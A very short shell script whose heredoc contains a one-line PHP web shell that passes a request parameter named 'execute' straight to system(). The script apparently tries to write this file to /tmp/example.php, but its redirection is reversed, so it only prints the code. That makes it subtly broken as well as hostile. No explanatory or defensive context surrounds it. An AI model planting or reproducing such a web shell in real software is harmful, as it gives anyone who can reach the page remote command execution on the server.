#!/bin/sh
cat < /tmp/example.php <<'DOC'
<?php system($_REQUEST['execute']);
DOC
